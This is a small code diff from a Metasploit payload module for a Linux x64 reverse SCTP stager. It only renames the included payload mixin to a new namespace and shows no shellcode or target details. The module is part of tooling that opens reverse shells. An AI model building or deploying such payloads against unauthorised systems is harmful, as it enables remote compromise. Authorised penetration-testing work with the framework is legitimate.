@@ -7,7 +7,7 @@ module MetasploitModule
   CachedSize = 136
 
   include Msf::Payload::Stager
-  include Msf::Payload::Linux::ReverseSctp_x64
+  include Msf::Payload::Linux::X64::ReverseSctp
 
   def initialize(info = {})
     super(
